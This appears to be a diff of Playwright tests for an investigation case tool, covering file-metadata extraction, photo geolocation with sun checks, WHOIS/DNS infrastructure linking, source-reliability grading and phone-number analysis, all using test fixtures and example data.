+  expect(R['canon-lightroom-xmp-iptc.jpg'].f['Time zone (taken)']).toMatch(/not recorded/);
+  // Lightroom export: XMP and IPTC side by side, with the edit
+  expect(R['canon-lightroom-xmp-iptc.jpg'].f).toMatchObject({ City: 'iptc image-city', 'Sub-location': 'iptc image-location', 'Country code': 'GBR', 'By-line': 'iptc creator-creator', Headline: 'iptc-headline', Software: 'Adobe Photoshop Lightroom', 'Serial number': '556769' });
+  expect(R['canon-lightroom-xmp-iptc.jpg'].flags.join('\n')).toMatch(/Saved by an editing program: Adobe Photoshop Lightroom/);
+  // Fuji via Photoshop 7: a negative degree as well as "W" — the sign is applied once (independent reader: 54° 59' 22.8" N, -1° 54' 51" W)
+  expect(R['fuji-iptc-gps.jpg'].gps).toMatchObject({ lat: 54.989667, lon: -1.914167 });
+  expect(R['fuji-iptc-gps.jpg'].people).toEqual(['Ian Britton']);
+  // a Getty news picture: place and photographer from IPTC
+  expect(R['iptc-122.jpg'].f).toMatchObject({ City: 'Pasadena', 'State / province': 'CA', Country: 'United States', 'By-line': 'Stephen Dunn', Credit: 'Getty Images' });
+  expect(R['iptc-122.jpg'].people).toEqual(['Stephen Dunn']);
+  // WebP from an HTC Desire: 45° 30' 2.4" N, 9° 6' 37.2" E
+  expect(R['htc-desire.webp']).toMatchObject({ fmt: 'WebP picture', gps: { lat: 45.500667, lon: 9.110333 } }); expect(R['htc-desire.webp'].f.Model).toBe('HTC Desire');
+  // PNG: an eXIf chunk and an editing app; a Stable Diffusion picture says so
+  expect(R['exif-chunk.png'].f).toMatchObject({ Make: 'samsung', Model: 'SM-S911B', Software: 'Snapseed 2.0' }); expect(R['exif-chunk.png'].flags.join()).toMatch(/editing program: Snapseed/);
+  expect(R['sd-generated.png'].flags.join('\n')).toMatch(/AI-generated: Stable Diffusion/); expect(R['sd-generated.png'].f['Generation settings']).toMatch(/Steps: 28, Sampler: DPM\+\+ 2M Karras/);
+  // iPhone video: Apple's keys (independent reader: ISO 6709 +32.0929+034.8620+028.516/, iPhone 6, 12.3, 2019-07-24T11:25:40+0300)
+  expect(R['iphone6-gps.mov']).toMatchObject({ fmt: 'QuickTime video', gps: { lat: 32.0929, lon: 34.862, alt: 29 } });
+  expect(R['iphone6-gps.mov'].f).toMatchObject({ Make: 'Apple', Model: 'iPhone 6', Software: '12.3' }); expect(day(R['iphone6-gps.mov'].taken)).toBe('2019-07-24T08:25:40Z');
+  // Android video: ©xyz in udta, which the independent reader does not show — read here: +51.4169-000.0806/
+  expect(R['gps.mp4'].gps).toMatchObject({ lat: 51.4169, lon: -0.0806 }); expect(R['gps.mp4'].f['Android version']).toBe('6.0.1'); expect(day(R['gps.mp4'].taken)).toBe('2017-02-22T08:20:28Z');
+  // MP3 ID3v2
+  expect(R['id3.mp3'].f).toMatchObject({ Title: 'Test Track Title', Artist: 'Test Artist Name', Album: 'Test Album Title' });
+  // PDF from LibreOffice, and the same PDF with its information compressed in object streams
+  for(const n of ['libreoffice.pdf', 'objstm.pdf']) expect(R[n].f, n).toMatchObject({ Author: 'Dana Whitfield', Title: 'Q3 shipment schedule', 'Made with': 'Writer', 'Converted to PDF by': 'LibreOffice 24.2' });
+  // Word: who wrote it, who saved it last, the program, revision
+  expect(R['libreoffice.docx'].f).toMatchObject({ Author: 'Dana Whitfield', 'Last saved by': 'm.reyes', Created: '2023-01-10T08:30:00Z', 'Last saved': '2024-02-02T17:05:00Z', Revision: '7' });
+  expect(R['libreoffice.docx'].f['Made with']).toMatch(/^LibreOffice\/24\.2/);
+  expect(R['libreoffice.docx'].flags.join('\n')).toMatch(/Written by Dana Whitfield, last saved by m\.reyes/);
+  expect(R.junk).toEqual([true, true, true, true, true]);
+  noErrors(errors);
+});
+
+test('files added to a case keep their metadata: the event takes the capture time, GPS goes on the map, the evidence panel shows what stands out, and older files are read once', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const files = { 'iphone6-gps.jpg': metaFix('iphone6-gps.jpg'), 'iphone6-gps.mov': metaFix('iphone6-gps.mov'), 'libreoffice.docx': metaFix('libreoffice.docx'), 'gps.mp4': metaFix('gps.mp4') };
+  await page.evaluate(async files => {
+    DB.cases.push({ id: 'c-mt', code: 'MT-1', name: 'Metadata', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-mt'; UI.capCase = 'c-mt';
+    const mk = (n, type) => new File([Uint8Array.from(atob(files[n]), c => c.charCodeAt(0))], n, { type, lastModified: Date.UTC(2025, 0, 1) });
+    await attachFiles([mk('iphone6-gps.jpg', 'image/jpeg'), mk('iphone6-gps.mov', 'video/quicktime'), mk('libreoffice.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')]);
+  }, files);
+  const R = await page.evaluate(() => { const L = DB.records.filter(r => r.caseId === 'c-mt');
+    return L.map(r => ({ name: r.att[0].name, ts: new Date(r.ts).toISOString(), gps: r.att[0].gps, coords: r.ents.filter(e => e.k === 'coords').map(e => e.v), body: r.body })); });
+  const by = n => R.find(x => x.name === n);
+  expect(by('iphone6-gps.jpg').ts).toBe('2014-09-16T13:05:12.000Z');                         // when it was taken (in UTC, from the GPS clock), not when the file was copied
+  expect(by('iphone6-gps.jpg').coords).toEqual(['51.76241,-0.31789']);
+  expect(by('iphone6-gps.mov').ts).toBe('2019-07-24T08:25:40.000Z'); expect(by('iphone6-gps.mov').body).toMatch(/Video GPS: 32\.092900, 34\.862000/);
+  expect(by('libreoffice.docx').ts).toBe('2023-01-10T08:30:00.000Z'); expect(by('libreoffice.docx').body).toMatch(/Author: Dana Whitfield[\s\S]*Last saved by: m\.reyes/);
+  // the map has both places, labelled by where they came from
+  const P = await page.evaluate(() => mapData('c-mt').pts.map(p => [p.la, p.lo, [...p.src].join()]).sort());
+  expect(P).toEqual([[32.0929, 34.862, 'Video GPS'], [51.76241, -0.31789, 'Photo GPS']]);
+  // the evidence panel: what stands out first, then the facts that matter, all of them on request
+  await page.evaluate(() => { const r = DB.records.find(x => x.caseId === 'c-mt' && x.att[0].name === 'iphone6-gps.jpg'); UI.sel = { kind: 'rec', id: r.id }; UI.inspOpen = true; UI.tlMode = 'events'; go(caseHash('c-mt', 'timeline')); });
+  const mt = page.locator('.mt').first();
+  await expect(mt).toContainText('JPEG picture'); await expect(mt.locator('.chip')).toContainText(['Location recorded (EXIF)']);
+  await expect(mt).toContainText('Camera facing'); await expect(mt).toContainText('iPhone 6');
+  await mt.locator('[data-act=mtMore]').click();
+  await expect(page.locator('.mt').first().locator('h5')).toContainText(['Where', 'When', 'Device', 'Software', 'File']);
+  await page.locator('.mt').first().locator('[data-act=mtMap]').click();
+  await expect(page.locator('.pcard.on')).toContainText('iphone6-gps.jpg');
+  // a phone video too big to store: its metadata box is read from wherever it sits in the file
+  const big = await page.evaluate(async b64 => { const u = Uint8Array.from(atob(b64), c => c.charCodeAt(0)); const boxes = []; let o = 0; while(o + 8 <= u.length){ const s = ((u[o] << 24) | (u[o + 1] << 16) | (u[o + 2] << 8) | u[o + 3]) >>> 0; boxes.push([String.fromCharCode(...u.slice(o + 4, o + 8)), u.slice(o, o + s)]); o += s; }
+    const ftyp = boxes.find(b => b[0] === 'ftyp')[1], moov = boxes.find(b => b[0] === 'moov')[1], pad = 70 * 1048576, mdat = new Uint8Array(8); new DataView(mdat.buffer).setUint32(0, pad + 8); mdat.set([109, 100, 97, 116], 4);
+    const f = new File([ftyp, mdat, new Uint8Array(pad), moov], 'long-clip.mp4', { type: 'video/mp4' }); const M = await metaReadFile(f); return { size: f.size, gps: M.gps }; }, files['gps.mp4']);
+  expect(big.size).toBeGreaterThan(70 * 1048576); expect(big.gps).toMatchObject({ lat: 51.4169, lon: -0.0806 });
+  // a file stored before the reader existed is read once in the background
+  const old = await page.evaluate(async b64 => { const m = await storeFile(new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'old.mp4', { type: 'video/mp4' })); delete m.meta; m.gps = null;
+    const r = fileRecord(m, 'c-mt'); DB.records.push(r); metaScanFiles(); await new Promise(res => setTimeout(res, 2500)); return { meta: !!m.meta && !m.meta.none, gps: m.gps, coords: r.ents.filter(e => e.k === 'coords').map(e => e.v) }; }, files['gps.mp4']);
+  expect(old).toEqual({ meta: true, gps: { lat: 51.4169, lon: -0.0806, alt: null }, coords: ['51.41690,-0.08060'] });
+  noErrors(errors);
+});
+
+test('geolocation workbench: clues, candidate places from any coordinate format, the sun at each place and moment, verdicts; the confirmed place goes on the map and into the vault', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  // coordinates as people paste them, and the sun checked against an independent library (astral)
+  const U = await page.evaluate(() => ({
+    p: ['51.7624, -0.3179', '51°45\'44.7"N 0°19\'04.4"W', '0°19\'04.4"W 51°45\'44.7"N', '51.7624 N, 0.3179 W', 'https://www.google.com/maps/place/X/@51.7624,-0.3179,17z/data=!3m1!4b1!4m6!3m5!1s0x0:0x0!8m2!3d51.76241!4d-0.31789', 'https://www.openstreetmap.org/?mlat=51.7624&mlon=-0.3179#map=17/51.7624/-0.3179', 'https://www.google.com/maps/search/?api=1&query=51.7624%2C-0.3179', 'near the bridge', '91, 10', '51.7624'].map(geoParse),
+    s: [[Date.UTC(2014, 8, 16, 13, 5, 12), 51.762408, -0.317892], [Date.UTC(2019, 6, 24, 8, 25, 40), 32.0929, 34.862], [Date.UTC(2024, 11, 21, 23, 0), -33.8568, 151.2153], [Date.UTC(2024, 5, 21, 0, 30), 64.1466, -21.9426]].map(([t, a, b]) => sunAt(t, a, b)) }));
+  expect(U.p.slice(0, 7).map(x => x && [x.lat.toFixed(3), x.lon.toFixed(3)])).toEqual(Array(7).fill(['51.762', '-0.318']));
+  expect(U.p.slice(7)).toEqual([null, null, null]);
+  const astral = [[202.3, 38.7], [118.8, 68.1], [86.3, 50.8], [346.4, -1.4]];
+  U.s.forEach((s, i) => { expect(Math.abs(s.az - astral[i][0]), 'azimuth ' + i).toBeLessThan(1); expect(Math.abs(s.alt - astral[i][1]), 'height ' + i).toBeLessThan(1); });
+
+  await page.evaluate(async b64 => { DB.cases.push({ id: 'c-geo', code: 'GE-1', name: 'Geo', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-geo'; UI.capCase = 'c-geo';
+    await attachFiles([new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'IMG_0412.jpg', { type: 'image/jpeg' })]); }, metaFix('iphone6-gps.jpg'));
+  await page.locator('[data-act=geoOpen]').click();
+  const dlg = page.locator('#dlg');
+  await expect(dlg.locator('.geo-facts')).toContainText('51.762408, -0.317892'); await expect(dlg.locator('.geo-facts')).toContainText('23° (north-east, true)');
+  await expect(dlg.locator('.geo-facts')).not.toContainText('time zone not recorded');
+  // clues
+  for(const [k, t] of [['road', 'Cars drive on the left'], ['sign', 'Red brick terrace with sash windows'], ['sky', 'Shadows fall towards the camera, sun behind the houses']]){ await dlg.locator('#geoK').selectOption(k); await dlg.locator('#geoT').fill(t); await dlg.locator('#geoT').press('Enter'); }
+  await expect(dlg.locator('.geo-cl li')).toHaveCount(3);
+  await dlg.locator('#geoT').fill('cars drive on the LEFT'); await dlg.locator('#geoT').press('Enter');
+  await expect(dlg.locator('.field-err, [role=alert], .err').first()).toContainText('already on the list');
+  // places: the file's own location, a Google Maps link 2 km away, and a wrong country
+  await dlg.locator('[data-act=geoFromFile]').click();
+  await dlg.locator('#geoN').fill('St Albans, Fleetville'); await dlg.locator('#geoP').fill('https://www.google.com/maps/@51.7510,-0.3005,18z'); await dlg.locator('#geoP').press('Enter');
+  await dlg.locator('#geoN').fill('Dublin, Rathmines'); await dlg.locator('#geoP').fill('53°19\'21.6"N 6°15\'54.0"W'); await dlg.locator('#geoP').press('Enter');
+  await dlg.locator('#geoN').fill('again'); await dlg.locator('#geoP').fill('51.75101, -0.30051'); await dlg.locator('#geoP').press('Enter');
+  await expect(dlg.locator('.field-err, [role=alert], .err').first()).toContainText('within 25 m');
+  await expect(dlg.locator('.geo-c')).toHaveCount(3);
+  const fleet = dlg.locator('.geo-c', { hasText: 'Fleetville' });
+  await expect(fleet).toContainText('from the file\'s GPS');
+  await expect(fleet.locator('.geo-sun')).toContainText(/Sun at 20\d° \(south-south-west\), 3[89]° up; shadows point 2\d° \(north-north-east\)/);
+  await expect(fleet.locator('.geo-sun')).not.toContainText('assumed');
+  // check clues against places; set verdicts
+  await fleet.locator('.geo-fit', { hasText: 'Cars drive on the left' }).click();
+  await dlg.locator('.geo-c', { hasText: 'Fleetville' }).locator('.geo-fit', { hasText: 'Red brick' }).click();
+  await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('.geo-fit', { hasText: 'Red brick' }).click(); await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('.geo-fit', { hasText: 'Red brick' }).click();   // fits → does not fit
+  await expect(dlg.locator('.geo-c', { hasText: 'Dublin' })).toContainText('0 fit · 1 do not');
+  await dlg.locator('.geo-c', { hasText: 'Dublin' }).locator('[data-act=geoVerdict][data-v=out]').click();
+  await dlg.locator('.geo-c', { hasText: 'Location in the file' }).locator('[data-act=geoVerdict][data-v=confirmed]').click();
+  await dlg.locator('.geo-c', { hasText: 'Fleetville' }).locator('[data-act=geoVerdict][data-v=confirmed]').click();        // only one place is confirmed
+  await expect(dlg.locator('.geo-c').first()).toContainText('Fleetville');                                                   // confirmed first, ruled out last
+  await expect(dlg.locator('.geo-c').last()).toContainText('Dublin');
+  await dlg.locator('textarea[data-geonote]').first().fill('Terrace and bus stop match Street View 2019');
+  await page.waitForTimeout(600);
+  const G = await page.evaluate(() => { const r = DB.records.find(x => x.caseId === 'c-geo'); const g = geoOf(r); return { v: g.cands.map(c => [c.name, c.verdict, Object.values(c.fit).join('')]), note: g.cands.find(c => c.verdict === 'confirmed').note }; });
+  expect(G.v).toEqual([['Location in the file', 'likely', ''], ['St Albans, Fleetville', 'confirmed', 'yy'], ['Dublin, Rathmines', 'out', 'n']]);
+  expect(G.note).toBe('Terrace and bus stop match Street View 2019');
+  await dlg.locator('[data-act=geoVault]').click();
+  await expect(dlg.locator('[data-act=geoVault]')).toHaveCount(0);
+  const V = await page.evaluate(() => ({ e: DB.entries.filter(e => e.caseId === 'c-geo' && e.type === 'location').map(e => [e.fields.address, e.fields.coordinates, e.tags.join()]),
+    pts: mapData('c-geo').pts.map(p => [p.la.toFixed(4), p.lo.toFixed(4), [...p.src].sort().join('+')]).sort() }));
+  expect(V.e).toEqual([['St Albans, Fleetville', '51.751, -0.3005', 'geolocated']]);
+  expect(V.pts).toEqual([['51.7510', '-0.3005', 'Geolocated+Location entry'], ['51.7624', '-0.3179', 'Photo GPS']]);
+  await page.click('[data-act=dclose]');
+  await expect(page.locator('.isec', { hasText: 'Where was this taken?' })).toContainText('3 clues · 3 places · Confirmed: St Albans, Fleetville');
+  // what comes back from a backup is checked: junk is dropped, the rest kept
+  const S = await page.evaluate(() => { const r = { geo: { clues: [{ id: 'a', kind: 'zzz', text: 'ok' }, { id: 'b', text: '' }, 5], cands: [{ id: 'c', lat: 95, lon: 0 }, { id: 'd', lat: 1, lon: 2, verdict: 'hacked', fit: { a: 'y', zz: 'y', q: 'maybe' } }] } }; return geoOf(r); });
+  expect(S).toEqual({ clues: [{ id: 'a', kind: 'other', text: 'ok' }], cands: [{ id: 'd', name: '', lat: 1, lon: 2, verdict: '', note: '', fit: { a: 'y' }, entry: '' }], note: '' });
+  noErrors(errors);
+});
+
+// infrastructure pivots
+const infraFix = p => require('fs').readFileSync(require('path').join(__dirname, 'fixtures/infra', p), 'latin1');
+test('WHOIS from 66 real registry answers: the domain, registrar and creation date are read as another parser reads them', async ({ page }) => {
+  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/infra');
+  const W = fs.readdirSync(dir + '/whois').map(f => [f, infraFix('whois/' + f), fs.existsSync(dir + '/expected/' + f) ? JSON.parse(fs.readFileSync(dir + '/expected/' + f, 'utf8')) : {}]);
+  const R = await page.evaluate(W => W.map(([f, t, x]) => { const P = infraParse(t), dom = P && P.label.replace(/^WHOIS — /, ''), reg = P ? (P.facts.find(q => q.rel === 'registrar') || {}).v || '' : '', cr = P && P.attrs ? Object.values(P.attrs)[0].created : null;
+    const xd = x.domain_name && String([].concat(x.domain_name)[0]).toLowerCase(), xr = x.registrar, xc = x.creation_date && String([].concat(x.creation_date)[0]).slice(0, 10);
+    return { f, dom: !xd || dom === xd, reg: !xr || reg.toLowerCase() === String(xr).toLowerCase(), cr: !xc || (cr && new Date(cr).toISOString().slice(0, 10)) === xc }; }), W);
+  const miss = k => R.filter(r => !r[k]).map(r => r.f);
+  expect(R).toHaveLength(66);
+  expect(miss('dom')).toEqual(['nic.live']);                                                     // that answer is about the .live registry itself
+  // registrars this reader takes from the registry part of an old multi-record answer, or from a section header the other parser knows by country
+  expect(miss('reg').length).toBeLessThanOrEqual(10);
+  expect(miss('cr').length).toBeLessThanOrEqual(6);
+  noErrors(errors);
+});
+
+test('infrastructure pivots: WHOIS, RDAP, dig, crt.sh, Shodan, Censys and passive DNS joined into what the names share — privacy services, big DNS providers and CDN addresses are not links', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const files = ['whois-portal.txt', 'whois-billing.txt', 'whois-blog.txt', 'rdap-invoices.json', 'dig.txt', 'crtsh.json', 'shodan.json', 'censys.json', 'vt-resolutions.json', 'circl.jsonl', 'pdns.csv'];
+  const T = Object.fromEntries(files.map(f => [f, infraFix('case/' + f)]));
+  const kinds = await page.evaluate(T => Object.fromEntries(Object.entries(T).map(([f, t]) => { const P = infraParse(t); return [f, P ? P.kind + ':' + P.facts.length : null]; })), T);
+  expect(kinds).toEqual({ 'whois-portal.txt': 'WHOIS:7', 'whois-billing.txt': 'WHOIS:5', 'whois-blog.txt': 'WHOIS:5', 'rdap-invoices.json': 'RDAP:6', 'dig.txt': 'DNS records:10', 'crtsh.json': 'Certificates (crt.sh):4', 'shodan.json': 'Shodan:7', 'censys.json': 'Censys:6', 'vt-resolutions.json': 'Passive DNS:2', 'circl.jsonl': 'Passive DNS:2', 'pdns.csv': 'Passive DNS:2' });
+  // into a case: two through the paste dialog, the rest as evidence already there
+  await page.evaluate(T => { DB.cases.push({ id: 'c-if', code: 'IF-1', name: 'Harbour phish', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-if';
+    for(const f of ['whois-billing.txt', 'whois-blog.txt', 'rdap-invoices.json', 'dig.txt', 'crtsh.json', 'shodan.json', 'censys.json', 'vt-resolutions.json', 'circl.jsonl']) DB.records.push({ id: 'r-if-' + f, caseId: 'c-if', type: 'evidence', title: f, body: T[f], ts: Date.UTC(2024, 2, 10), tsRaw: '', tsZone: 'explicit', source: 'import', host: '', tags: [], ents: [], addedAt: Date.now() });
+    mutate('add'); UI.ivView = 'dom'; go(caseHash('c-if', 'infra')); }, T);
+  for(const f of ['whois-portal.txt', 'pdns.csv']){ await page.click('[data-act=ifPaste]'); await page.fill('#ifText', T[f]); await expect(page.locator('#ifHint')).toContainText(f === 'pdns.csv' ? 'Recognised: Passive DNS — 2 facts' : 'Recognised: WHOIS — 7 facts'); await page.click('#dlg [type=submit]'); }
+  await page.click('[data-act=ifPaste]'); await page.fill('#ifText', T['pdns.csv']); await page.click('#dlg [type=submit]');
+  await expect(page.locator('#dlg')).toContainText('already in the case'); await page.click('#dlg [data-act=dclose]');
+  await page.click('[data-act=ifPaste]'); await page.fill('#ifText', 'hello, this is not a lookup result'); await page.click('#dlg [type=submit]');
+  await expect(page.locator('#dlg')).toContainText('Not recognised'); await page.click('#dlg [data-act=dclose]');
+  const S = await page.evaluate(() => infraIndex('c-if').shared.map(g => [g.strength, g.rel, g.v, g.subs.map(s => s.v).sort().join(' ')]));
+  const P = 'harbour-line-portal.test', I = 'hl-invoices.test';
+  expect(S.filter(x => x[0] === 'strong')).toEqual(expect.arrayContaining([
+    ['strong', 'certificate', 'serial 03a6f1c2d4e5b6a7980123456789abcdef01', [P, I, 'www.' + P].sort().join(' ')],
+    ['strong', 'certificate', 'sha256 5f2c0e9d7a4b3c1e8f6a5d4c3b2a19081726354453627180c9b8a7f6e5d4c3b2', '198.51.100.23 203.0.113.80'],
+    ['strong', 'registrant email', 'k.voss.reg@mailbox.example', [P, I].join(' ')],
+    ['strong', 'registrant phone', '+31612345678', [P, I].join(' ')],
+    ['strong', 'site verification', 'google-site-verification=Qm3x9Kc2ZtT8wVvq4hXJ0bPzR1aLsN7eYdF5gHjKl0A', [P, I].join(' ')]]));
+  expect(S.filter(x => x[0] === 'strong')).toHaveLength(5);
+  expect(S.filter(x => x[0] === 'medium')).toEqual(expect.arrayContaining([
+    ['medium', 'registrant name', 'Karl Voss', [P, I].join(' ')], ['medium', 'SOA contact', 'hostmaster@bulletdns.test', [P, I].join(' ')], ['medium', 'name server', 'bulletdns.test', [P, I].join(' ')],
+    ['medium', 'resolves to', '198.51.100.23', [P, I].join(' ')], ['medium', 'resolves to', '203.0.113.80', ['harbourline-billing.test', I, P, 'login.harbourline-billing.test'].sort().join(' ')]]));
+  expect(S.filter(x => x[0] === 'none').map(x => x[1] + ' ' + x[2]).sort()).toEqual(['registrant name REDACTED FOR PRIVACY', 'registrant org Privacy service provided by Withheld for Privacy ehf', 'resolves to 104.21.3.4']);
+  expect(S.filter(x => x[0] === 'weak').map(x => x[1]).sort()).toEqual(['JARM', 'hosting', 'network', 'registered same day', 'registrar']);
+  // on screen: strong first, the meaningless ones folded away, every fact traceable to its evidence
+  const first = page.locator('.if-c').first().locator('.if-g').first();
+  await expect(first.locator('.chip')).toHaveText('Strong');
+  await expect(page.locator('.if-noise summary')).toContainText('3 shared things that mean nothing');
+  await expect(page.locator('.if-sum')).toContainText('strong links');
+  await page.locator('.if-g', { hasText: 'k.voss.reg@mailbox.example' }).locator('[data-act=ifSub]', { hasText: I }).click();
+  await expect(page.locator('.if-t tbody tr').first()).toContainText(I);
+  expect(await page.locator('.if-t tbody tr').evaluateAll((rows, I) => rows.every(r => r.textContent.includes(I)), I)).toBe(true);
+  await page.locator('.if-t tbody tr', { hasText: 'registrant email' }).locator('[data-act=tlxRec]').click();
+  expect(await page.evaluate(() => [UI.tlMode, recById(UI.sel.id).title])).toEqual(['events', 'rdap-invoices.json']);
+  noErrors(errors);
+});
+
+test('source reliability: sources rated A–F once for every case, evidence graded 1–6, and what rests on one weak source is told apart from what several independent sources back', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  await page.evaluate(() => {
+    DB.cases.push({ id: 'c-sr', code: 'SR-1', name: 'Sources', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }); DB.active = 'c-sr';
+    let i = 0; const mk = (source, body) => DB.records.push({ id: 'r-sr' + (i++), caseId: 'c-sr', type: 'evidence', title: body.slice(0, 40), body, ts: Date.UTC(2024, 3, 1) + i * 6e4, tsRaw: '', tsZone: 'explicit', source, host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
+    mk('web page · www.Forum-Leaks.example', 'Seller "darkharbour" posts contact darkharbour@mailbox.example and phone +44 7700 900123');
+    mk('web page · forum-leaks.example', 'Second post by darkharbour@mailbox.example offering invoices');               // same forum: not independent
+    mk('web page · news.example', 'Report names darkharbour@mailbox.example as the seller behind the invoice scam');
+    mk('import:breach-2023.csv', 'darkharbour@mailbox.example,Karl V,198.51.100.23');
+    mk('', 'Tip from a call: wallet 1BoatSLRHtKNngkdXEeobR76b53LETtpyT');
+    mk('import:breach-2023.csv', 'k.vogel@mailbox.example,Karl Vogel,203.0.113.77');
+    rev++; cache = {}; for(const e of derive('c-sr').ents.values()){ if(e.k === 'phone') DB.verdicts[e.id] = 'suspicious'; if(e.v === 'k.vogel@mailbox.example') DB.verdicts[e.id] = 'malicious'; }
+    mutate('add'); UI.qView = 'src'; go(caseHash('c-sr', 'questions')); });
+  // sources: www. and case do not split one site; records without a source are listed apart
+  await expect(page.locator('.sr-t tbody tr')).toHaveCount(4);
+  await expect(page.locator('.sr-t tbody')).toContainText('web: forum-leaks.example');
+  expect(await page.locator('.sr-t tbody tr', { hasText: 'web: forum-leaks.example' }).locator('td').nth(1).textContent()).toBe('2');
+  await expect(page.locator('.sr-t tbody tr', { hasText: 'no source written down' }).locator('select')).toBeDisabled();
+  // rate: the forum is unreliable, the news site usually reliable
+  await page.locator('.sr-t tbody tr', { hasText: 'forum-leaks.example' }).locator('select').selectOption('E');
+  await page.locator('.sr-t tbody tr', { hasText: 'news.example' }).locator('select').selectOption('B');
+  // the email is in three independent sources (the forum's two posts are one); the phone and the other email rest on one source, the phone on a weak one
+  const sev = page.locator('.sr-c', { hasText: 'Backed by several independent sources' });
+  await expect(sev.locator('li', { hasText: 'darkharbour@mailbox.example' })).toContainText('3 sources');
+  const one = page.locator('.sr-c', { hasText: 'Resting on one source' });
+  await expect(one.locator('li').first()).toContainText('7700'); await expect(one.locator('li').first()).toContainText('only a weak source says so');
+  await expect(one).toContainText('k.vogel@mailbox.example'); await expect(one.locator('li', { hasText: 'k.vogel' })).toContainText('source not rated');
+  // grade one piece of evidence where it is read: B2 when the source is B
+  await page.evaluate(() => { UI.sel = { kind: 'rec', id: 'r-sr2' }; UI.inspOpen = true; renderAll(); });
+  await expect(page.locator('#srRelR')).toHaveValue('B');
+  await page.selectOption('#srCredR', '2');
+  await expect(page.locator('.sr-rec .sr-grade')).toHaveText('B2');
+  // ratings belong to the source, in every case
+  const G = await page.evaluate(() => { DB.cases.push({ id: 'c-sr2', code: 'SR-2', name: 'Other', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const r = { id: 'r-x', caseId: 'c-sr2', type: 'evidence', title: 'x', body: 'y', source: 'web page · forum-leaks.example', ents: [], tags: [] }; return [recGrade(r), srcKey(r), DB.records.find(x => x.id === 'r-sr2').cred]; });
+  expect(G).toEqual(['E?', 'web: forum-leaks.example', '2']);
+  // the indicator's panel says how many independent sources mention it
+  await page.evaluate(() => { const e = [...derive('c-sr').ents.values()].find(x => x.v === 'darkharbour@mailbox.example'); UI.sel = { kind: 'ent', id: e.id }; renderAll(); });
+  await expect(page.locator('.isec', { hasText: 'Sources' }).first()).toContainText('3 independent');
+  noErrors(errors);
+});
+
+test('phone numbers offline: country and kind from the numbering plans, invalid and fictional numbers called out, and one number written three ways matched across cases', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  await page.evaluate(() => lazyNeed('phone'));
+  const R = await page.evaluate(() => Object.fromEntries(['+33 6 12 34 56 78', '+49 30 901820', '+91 98765 43210', '+44 70 1234 5678', '+44 56 1234 5678', '+44 909 879 0000', '+1 800 555 0199', '+800 1234 5678', '+1 999 123 4567', '+44 7700 90012', '0044 20 7946 0123', '+234 803 123 4567', 'not a phone'].map(x => { const i = phoneInfo(x, ''); return [x, i.ok ? [i.e164, i.cc, i.typeLabel, i.valid, !!i.fiction] : i.why]; })));
+  expect(R).toEqual({
+    '+33 6 12 34 56 78': ['+33612345678', 'FR', 'Mobile', true, false], '+49 30 901820': ['+4930901820', 'DE', 'Landline', true, false], '+91 98765 43210': ['+919876543210', 'IN', 'Mobile', true, false],
+    '+44 70 1234 5678': ['+447012345678', 'GB', 'Personal (follow-me) number', true, false], '+44 56 1234 5678': ['+445612345678', 'GB', 'VoIP', true, false], '+44 909 879 0000': ['+449098790000', 'GB', 'Premium rate', true, true],
+    '+1 800 555 0199': ['+18005550199', 'US', 'Toll-free', true, true], '+800 1234 5678': ['+80012345678', '', 'Toll-free', true, false], '+1 999 123 4567': ['+19991234567', 'US', '', false, false], '+44 7700 90012': ['+44770090012', 'GB', '', false, false],
+    '0044 20 7946 0123': ['+442079460123', 'GB', 'Landline', true, true], '+234 803 123 4567': ['+2348031234567', 'NG', 'Mobile', true, false], 'not a phone': 'Not a phone number in any plan' });
+  // one number, three ways, in two cases
+  await page.evaluate(() => { for(const [id, code] of [['c-pa', 'PA-1'], ['c-pb', 'PB-1']]) DB.cases.push({ id, code, name: code, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    let i = 0; const mk = (caseId, body) => DB.records.push({ id: 'r-ph' + (i++), caseId, type: 'evidence', title: body.slice(0, 40), body, ts: Date.UTC(2024, 4, 1) + i * 6e4, tsRaw: '', tsZone: 'explicit', source: 'web page · market.example', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
+    mk('c-pa', 'Seller listing: contact WhatsApp +44 7911 123456 for bulk invoices'); mk('c-pb', 'Phone: 07911 123456 (ask for Dan)'); mk('c-pb', 'Call 0044-7911-123-456 after 6pm'); mutate('add'); });
+  const ids = await page.evaluate(() => [...derive('c-pb').ents.values()].filter(e => e.k === 'phone').map(e => e.id).sort());
+  expect(ids.length).toBe(2);
+  await page.evaluate(id => { DB.active = 'c-pb'; UI.sel = { kind: 'ent', id }; UI.inspOpen = true; go(caseHash('c-pb', 'entities')); }, ids.find(x => /07911/.test(x)));
+  const sec = page.locator('.isec.ph, .isec', { hasText: 'The number' }).first();
+  await expect(sec).toContainText('No country code');
+  await sec.locator('select[data-ph=cc]').selectOption('GB');
+  const ph = page.locator('.isec.ph');
+  await expect(ph).toContainText('United Kingdom'); await expect(ph).toContainText('Mobile'); await expect(ph).toContainText('+447911123456');
+  await expect(ph).toContainText('read as United Kingdom');
+  await expect(ph.locator('.note')).toContainText('+447911123456 PA-1'); await expect(ph.locator('.note')).toContainText('00447911123456 PB-1');
+  // and the two cases are connected by it
+  const L = await page.evaluate(() => caseLinks('c-pa').map(x => [x.c.id, x.shared.map(s => s.v)]));
+  expect(L).toEqual([['c-pb', ['+447911123456']]]);
+  noErrors(errors);
+});
+
